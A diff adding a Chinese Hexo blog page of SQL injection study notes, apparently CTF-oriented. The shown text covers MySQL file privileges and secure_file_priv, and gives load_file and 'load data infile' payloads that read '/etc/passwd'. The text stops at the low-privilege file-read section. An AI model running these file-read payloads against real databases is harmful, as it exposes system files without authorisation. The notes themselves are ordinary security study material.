@@ -1,0 +1,1249 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>Web学习笔记 之 SQL注入 | Van1sh的小屋</title>
+  <meta name="keywords" content=" Web , SQL ">
+  <meta name="description" content="Web学习笔记 之 SQL注入 | Van1sh的小屋">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Van1sh的小屋">
+<meta property="og:url" content="http://jayxv.github.io/categories/index.html">
+<meta property="og:site_name" content="Van1sh的小屋">
+<meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-07-14T08:00:41.247Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Van1sh的小屋">
+<meta name="twitter:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Van1sh</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+        <a title="github" href="https://github.com/JayxV" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:643713081@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=643713081&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(31)</small></div></li>
+    
+        
+            
+            <li><div data-rel="比赛小屋">比赛小屋<small>(10)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="工具小屋">工具小屋<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="密码小屋"><i class="fold iconfont icon-right"></i>密码小屋<small>(12)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="ECC">ECC<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Paillier">Paillier<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Stream">Stream<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Lattice">Lattice<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Knapsack">Knapsack<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Rsa">Rsa<small>(3)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Basic">Basic<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Block">Block<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="RSA">RSA<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="Web小屋"><i class="fold iconfont icon-right"></i>Web小屋<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Files related">Files related<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="SQL">SQL<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="XSS">XSS<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="小书屋">小书屋<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="31">
+<input type="hidden" id="yelog_site_word_count" value="135.4k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://www.fzwjscj.xyz/">fzwjscj</a></li>
+            
+            <li><a target="_blank" href="http://dldxz.cn/">DLDXZ</a></li>
+            
+            <li><a target="_blank" href="http://fanda.cloud/">fanda</a></li>
+            
+            <li><a target="_blank" href="http://passingfoam.com/">PassingFoam&#39;s blog</a></li>
+            
+            <li><a target="_blank" href="https://eqqie.cn/">赤道企鹅</a></li>
+            
+            <li><a target="_blank" href="http://blog.ragdoll.work/">咲夜南梦</a></li>
+            
+            <li><a target="_blank" href="https://www.zhaoj.in/">glzjin</a></li>
+            
+            <li><a target="_blank" href="https://coinc1dens.github.io/">Coinc1dens</a></li>
+            
+            <li><a target="_blank" href="http://blog.soreatu.com/">soreatu</a></li>
+            
+            <li><a target="_blank" href="http://www.ga1axy.top/">盖乐希</a></li>
+            
+            <li><a target="_blank" href="https://shawroot.cc/">Root.</a></li>
+            
+            <li><a target="_blank" href="https://l1near.top/">l1near</a></li>
+            
+            <li><a target="_blank" href="https://0xdktb.top/">0xDktb</a></li>
+            
+            <li><a target="_blank" href="https://www.wootec.top/">Reverier</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Write Up</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Sage</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ECC</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Paillier</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Files</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Serialization</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Rc4</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SM4</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">Lattice</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Dsa</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">LCG</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Knapsack</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Rsa</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SQL</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">python</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Book</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">操作模式</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">number theory</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Abstract algebra</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">XSS</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Nmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Coppersmith’s Method</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">book</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="密码小屋 Basic "
+           href="/2020/05/27/密码学学习笔记之introduction to mathematical cryptography/"
+           data-tag="Book"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 introduction to mathematical cryptography">密码学学习笔记 之 introduction to mathematical cryptography</span>
+            <span class="post-date" title="2020-05-27 21:05:00">2020/05/27</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2020/08/13/密码学学习笔记 之 coppersmith/"
+           data-tag="Coppersmith’s Method"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 Coppersmith’s Method">密码学学习笔记 之 Coppersmith’s Method</span>
+            <span class="post-date" title="2020-08-13 10:00:00">2020/08/13</span>
+        </a>
+        
+        <a  class="Web小屋 Files related "
+           href="/2020/08/09/Web学习笔记 之 文件与序列化/"
+           data-tag="Web,Files,Serialization"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 文件与序列化">Web学习笔记 之 文件与序列化</span>
+            <span class="post-date" title="2020-08-09 14:16:00">2020/08/09</span>
+        </a>
+        
+        <a  class="Web小屋 SQL "
+           href="/2020/08/07/Web学习笔记 之 SQL注入/"
+           data-tag="Web,SQL"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 SQL注入">Web学习笔记 之 SQL注入</span>
+            <span class="post-date" title="2020-08-07 13:18:00">2020/08/07</span>
+        </a>
+        
+        <a  class="Web小屋 XSS "
+           href="/2020/07/26/Web学习笔记 之 XSS/"
+           data-tag="Web,XSS"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 XSS">Web学习笔记 之 XSS</span>
+            <span class="post-date" title="2020-07-26 10:44:00">2020/07/26</span>
+        </a>
+        
+        <a  class="密码小屋 Knapsack "
+           href="/2020/06/08/密码学学习笔记之knapsack /"
+           data-tag="Knapsack"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 knapsack">密码学学习笔记 之 knapsack</span>
+            <span class="post-date" title="2020-06-08 10:30:43">2020/06/08</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/26/2020BJD3rd/"
+           data-tag="Write Up"
+           data-author="Van1sh &amp; FzWjScJ" >
+            <span class="post-title" title="2020 BJD3rd">2020 BJD3rd</span>
+            <span class="post-date" title="2020-05-26 16:00:47">2020/05/26</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/24/2020GKCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 GKCTF">2020 GKCTF</span>
+            <span class="post-date" title="2020-05-24 17:05:00">2020/05/24</span>
+        </a>
+        
+        <a  class="密码小屋 RSA "
+           href="/2020/05/20/密码学学习笔记之RSA/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 RSA">密码学学习笔记 之 RSA</span>
+            <span class="post-date" title="2020-05-20 20:40:00">2020/05/20</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2020/05/20/sage常用命令/"
+           data-tag="Sage"
+           data-author="Van1sh" >
+            <span class="post-title" title="sage常用命令">sage常用命令</span>
+            <span class="post-date" title="2020-05-20 11:22:00">2020/05/20</span>
+        </a>
+        
+        <a  class="密码小屋 Paillier "
+           href="/2020/05/14/密码学学习笔记之paillier cryptosystem/"
+           data-tag="Paillier"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 paillier cryptosystem">密码学学习笔记 之 paillier cryptosystem</span>
+            <span class="post-date" title="2020-05-14 11:00:19">2020/05/14</span>
+        </a>
+        
+        <a  class="密码小屋 Lattice "
+           href="/2020/05/12/密码学学习笔记之HNP/"
+           data-tag="Lattice,Dsa,LCG"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 HNP">密码学学习笔记 之 HNP</span>
+            <span class="post-date" title="2020-05-12 10:00:57">2020/05/12</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/10/2020网鼎杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 网鼎杯">2020 网鼎杯</span>
+            <span class="post-date" title="2020-05-10 21:15:00">2020/05/10</span>
+        </a>
+        
+        <a  class="密码小屋 ECC "
+           href="/2020/05/07/密码学学习笔记之NCCIP/"
+           data-tag="ECC"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 NCCIP">密码学学习笔记 之 NCCIP</span>
+            <span class="post-date" title="2020-05-07 10:30:43">2020/05/07</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/05/2020De1CTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 De1CTF">2020 De1CTF</span>
+            <span class="post-date" title="2020-05-05 15:57:00">2020/05/05</span>
+        </a>
+        
+        <a  class="密码小屋 Block "
+           href="/2020/03/03/密码学学习笔记之分组密码操作模式/"
+           data-tag="操作模式"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 分组密码操作模式">密码学学习笔记 之 分组密码操作模式</span>
+            <span class="post-date" title="2020-03-03 15:15:00">2020/03/03</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/02/18/2020hgame_week1/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 hgame week1">2020 hgame week1</span>
+            <span class="post-date" title="2020-02-18 16:22:35">2020/02/18</span>
+        </a>
+        
+        <a  class="密码小屋 Stream "
+           href="/2020/01/30/密码学学习笔记之RC4与SM4/"
+           data-tag="Rc4,SM4"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 RC4与SM4">密码学学习笔记 之 RC4与SM4</span>
+            <span class="post-date" title="2020-01-30 00:05:00">2020/01/30</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2019/12/04/密码学学习笔记之浅析On r-th Root Extraction Algorithm in Fq/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq">密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</span>
+            <span class="post-date" title="2019-12-04 14:30:46">2019/12/04</span>
+        </a>
+        
+        <a  class="密码小屋 Basic "
+           href="/2019/12/03/密码学学习笔记之数论四大定理及应用/"
+           data-tag="number theory,Abstract algebra"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 数论四大定理及应用">密码学学习笔记 之 数论四大定理及应用</span>
+            <span class="post-date" title="2019-12-03 15:30:25">2019/12/03</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2019/11/11/密码学学习笔记之浅析Pollard's rho algorithm及其应用/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用">密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</span>
+            <span class="post-date" title="2019-11-11 15:32:00">2019/11/11</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/11/08/2019UNCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 UNCTF">2019 UNCTF</span>
+            <span class="post-date" title="2019-11-08 11:30:30">2019/11/08</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/11/01/docker和docker-compose的安装/"
+           data-tag="docker"
+           data-author="Van1sh" >
+            <span class="post-title" title="安装Docker 和 Docker-Compose以及docker images的制作及上传">安装Docker 和 Docker-Compose以及docker images的制作及上传</span>
+            <span class="post-date" title="2019-11-01 21:00:00">2019/11/01</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/09/12/Linux 基础/"
+           data-tag="Linux"
+           data-author="Vanish" >
+            <span class="post-title" title="Linux 基础">Linux 基础</span>
+            <span class="post-date" title="2019-09-12 00:17:00">2019/09/12</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/29/2019第五空间/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 第五空间">2019 第五空间</span>
+            <span class="post-date" title="2019-08-29 12:18:35">2019/08/29</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/27/2019OGeek/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 OGeek">2019 OGeek</span>
+            <span class="post-date" title="2019-08-27 11:02:35">2019/08/27</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/03/2019De1CTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 De1CTF">2019 De1CTF</span>
+            <span class="post-date" title="2019-08-03 22:14:55">2019/08/03</span>
+        </a>
+        
+        <a  class="小书屋 "
+           href="/2019/08/02/三体/"
+           data-tag="book"
+           data-author="Van1sh" >
+            <span class="post-title" title="三体">三体</span>
+            <span class="post-date" title="2019-08-02 12:56:00">2019/08/02</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/07/22/nmap/"
+           data-tag="Nmap"
+           data-author="Van1sh" >
+            <span class="post-title" title="初遇Nmap">初遇Nmap</span>
+            <span class="post-date" title="2019-07-22 16:07:55">2019/07/22</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/07/21/python 正则/"
+           data-tag="python"
+           data-author="Van1sh" >
+            <span class="post-title" title="python 之 正则">python 之 正则</span>
+            <span class="post-date" title="2019-07-21 22:30:35">2019/07/21</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/07/15/2019赛博杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 赛博杯">2019 赛博杯</span>
+            <span class="post-date" title="2019-07-15 16:22:35">2019/07/15</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-Web学习笔记 之 SQL注入" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Web学习笔记 之 SQL注入</h1>
+    
+    <div class="article-meta">
+        
+        
+        <span class="author"><a>Van1sh</a></span>
+        
+        
+        <span class="book">
+            
+                <a  data-rel="Web小屋">Web小屋</a>/
+            
+                <a  data-rel="SQL">SQL</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">Web</a>
+            
+            <a class="color4">SQL</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-08-12 22:38:01'>2020-08-07 13:18</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:4.2k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文件读-写"><span class="toc-text">文件读/写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#读"><span class="toc-text">读</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#低权限读取文件"><span class="toc-text">低权限读取文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#写"><span class="toc-text">写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#日志法"><span class="toc-text">日志法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNSLOG带出数据"><span class="toc-text">DNSLOG带出数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#联合查询注入"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#exp"><span class="toc-text">exp()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-text">updatexml()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-text">extractvalue()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#几何函数"><span class="toc-text">几何函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#不存在的函数"><span class="toc-text">不存在的函数</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#布尔"><span class="toc-text">布尔</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#时间"><span class="toc-text">时间</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二次注入"><span class="toc-text">二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#关键字过滤"><span class="toc-text">关键字过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一些小Trick"><span class="toc-text">一些小Trick</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP-union-select-ig绕过。"><span class="toc-text">PHP/union.+?select/ig绕过。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LIMIT之后的字段数判断"><span class="toc-text">LIMIT之后的字段数判断</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#实例："><span class="toc-text">实例：</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这篇主要是搬的<a href="https://www.0x002.com/2020/%E5%AF%B9MYSQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9%E5%8F%8A%E9%83%A8%E5%88%86Trick%E7%9A%84%E5%BD%92%E7%B1%BB%E5%B0%8F%E7%BB%93/#%E4%BB%80%E4%B9%88%E6%98%AFSQL%E6%B3%A8%E5%85%A5%EF%BC%9F" target="_blank" rel="noopener">Yunen</a>师傅的博客，觉得他整理的已经比较好了。</p>
+<p>&emsp;&emsp;注入攻击的本质，是把用户输入的数据当作代码执行。这里有两个关键，第一个是用户能够控制输入；第二个是原本程序要执行的代码，拼接了用户的数据。——《白帽子讲Web安全》</p>
+<p>&emsp;&emsp;上一章的XSS是一种针对HTML的注入攻击，而本章的SQL注入，顾名思义就是对SQL数据库的注入攻击。【这里针对Mysql】【在注入过程中，除了拼接，闭合-逃逸 这个步骤也经常出现。所以如果waf住了这里，是否还有别的方法呢？——憨憨弟弟如是想】</p>
+<p>一个完整的mysql管理系统结构通常如下图<img src="https://i.loli.net/2020/07/27/SYRktVrzCwZl9Fd.png" alt="image-20200727141611549"></p>
+<p>我们知道，在数据库中，常见的对数据进行处理的操作有：<strong>增、删、查、改</strong>这四种。</p>
+<p>每一项操作都具有不同的作用，共同构成了对数据的绝大部分操作。</p>
+<ul>
+<li><p>增。顾名思义，也就是增加数据。在通用的SQL语句中，其简单结构通常可概述为:</p>
+<p> <code>INSERT table_name(columns_name) VALUES(new_values)</code>。</p>
+</li>
+</ul>
+<ul>
+<li><p>删。删除数据。简单结构为:</p>
+<p> <code>DELETE table_name WHERE condition</code>。</p>
+</li>
+</ul>
+<ul>
+<li><p>查。查询语句可以说是绝大部分应用程序最常用到的SQL语句，他的作用就是查找数据。其简单结构为：</p>
+<p><code>SELECT columns_name FROM table_name WHERE condition</code>。</p>
+</li>
+</ul>
+<ul>
+<li><p>改。有修改/更新数据。简单结构为:</p>
+<p><code>UPDATE table_name SET column_name=new_value WHERE condition</code>。</p>
+</li>
+</ul>
+<p>PS：以上SQL语句中，系统关键字全部进行了大写处理。</p>
+<h2 id="文件读-写"><a href="#文件读-写" class="headerlink" title="文件读/写"></a>文件读/写</h2><p>我们知道Mysql是很灵活的，它支持文件读/写功能。在讲这之前，有必要介绍下什么是<code>file_priv</code>和<code>secure-file-priv</code>。</p>
+<p>简单的说：<code>file_priv</code>是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述payload查询权限。</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> file_priv <span class="keyword">from</span> mysql.<span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span>=$<span class="keyword">USER</span> host=$HOST;</span><br></pre></td></tr></table></figure>
+
+<p><code>secure-file-priv</code>是一个系统变量，对于文件读/写功能进行限制。具体如下：</p>
+<ul>
+<li>无内容，表示无限制。</li>
+<li>为NULL，表示禁止文件读/写。</li>
+<li>为目录名，表示仅允许对特定目录的文件进行读/写。</li>
+</ul>
+<p>注：<strong>5.5.53本身及之后的版本默认值为NULL，之前的版本无内容</strong>。</p>
+<p>三种方法查看当前<code>secure-file-priv</code>的值：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Code</span><br><span class="line"><span class="keyword">select</span> @@secure_file_priv;</span><br><span class="line"><span class="keyword">select</span> @@global.secure_file_priv;</span><br><span class="line"><span class="keyword">show</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">"secure_file_priv"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>修改：</p>
+<ul>
+<li>通过修改my.ini文件，添加：<code>secure-file-priv=</code></li>
+<li>启动项添加参数：<code>mysqld.exe --secure-file-priv=</code></li>
+</ul>
+<h3 id="读"><a href="#读" class="headerlink" title="读"></a>读</h3><p>Mysql读取文件通常使用load_file函数，语法如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">load_file</span>(file_path);</span><br></pre></td></tr></table></figure>
+
+<p>第二种读文件的方法：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>; <span class="comment">#读取服务端文件</span></span><br></pre></td></tr></table></figure>
+
+<p>第三种：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">"/etc/passwd"</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span> <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'\n'</span>; <span class="comment">#读取客户端文件</span></span><br></pre></td></tr></table></figure>
+
+<p>限制：</p>
+<ul>
+<li>前两种需要<code>secure-file-priv</code>无值或为有利目录。</li>
+<li>都需要知道要读取的文件所在的绝对路径。</li>
+<li>要读取的文件大小必须小于<code>max_allowed_packet</code>所设置的值</li>
+</ul>
+<h4 id="低权限读取文件"><a href="#低权限读取文件" class="headerlink" title="低权限读取文件"></a>低权限读取文件</h4><p>5.5.53<code>secure-file-priv=NULL</code>读文件payload，mysql8测试失败，其他版本自测。</p>
